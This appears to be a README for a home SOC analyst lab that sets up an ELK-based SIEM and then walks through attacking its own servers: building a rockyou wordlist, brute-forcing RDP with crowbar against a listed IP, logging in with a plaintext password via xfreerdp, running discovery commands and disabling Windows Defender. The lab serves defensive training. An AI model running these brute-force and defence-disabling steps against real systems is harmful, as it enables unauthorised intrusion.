# SocAnalyst

This project aims to demonstrate step-by-step how to create a SIEM infratstructure capable of logging attempts to breach network security.

For this project a series of servers were created in order to log attempts, either SSH or RDP based.

Elastic servers were also created in order to provide log integrity in case one of the servers was compromised. It also provides a GUI proportioning ease for log access.

## Infrastructure

It consists of 3 vLans:

1. ELK vLan
2. Windows Server vLan
3. Ubuntu Server vLan

### ELK vLan

- Fleet server: Pulls logs from assigned servers and sends them to Elasticsearch server
- Elasticsearch & Kibana server: Used to create the GUI used for log inspection

## Project Diagram

## ![Diagram](/images/30-day-dFir-Diagram.jpg)

Once the infrastructure is setup the project aims to complete the attack diagram by:

1. Brute forcing either Windows server of ubuntu server using a kali linux machine.
2. During discovery look for potential targets
3. Disable Windows Defender
4. Execute payload from Mythic agent
5. Stablish Command & Control
6. Exfiltrate data

## Attack Diagram

![attackDiagram](/images/atackDiagram.jpg)

### Following the diagram

#### Phase 1

On kali Linux's terminal

1. `cd /usr/share/wordlists`
   ![kaliWordlists](/images/kaliWordlists.png)
2. `sudo gunzip rockyou.txt.gz`

3. `head -50 rockyou.txt > ~/kali-wordlist.txt`

4. append the server password to the list: `echo "{SERVER_PASSWORD}" >> ~/kali-wordlist.txt`
5. `sudo apt update && sudo apt upgrade -y`
6. `sudo apt install crowbar -y`
7. Create a target txt file with:

   - Target IP Address
   - Target username

8. `crowbar -b rdp -u rfAdmin123 -C kali-wordlist.txt -s 4.182.221.204/32`

   - -b {openvpn,rdp,sshkey,vnckey}, --brute {openvpn,rdp,sshkey,vnckey}
     Target service
   - -u USERNAME [USERNAME ...], --username USERNAME [USERNAME ...]
     Static name to login with
   - -C FILE, --passwdfile FILE
     Multiple passwords to login with, stored in a file
   - -s SERVER, --server SERVER
     Static target

![crowbarSuccess](/images/crowbarSuccess.png)

9. `xfreerdp /u:rfAdmin123 /p:Spring2025! /v:4.182.221.204`

   - /u: Username
   - /p: Password
   - /v: Server hostname

10. Do you trust the certificate? `Y`

_Connection successful_

#### Phase 2

1. Open command prompt
2. Run commands `whoami` `ipconfig` `net user` `net group` `net user {WHOAMI_USER}`

#### Phase 3

1. On windows security settings disable all options for realtime protection
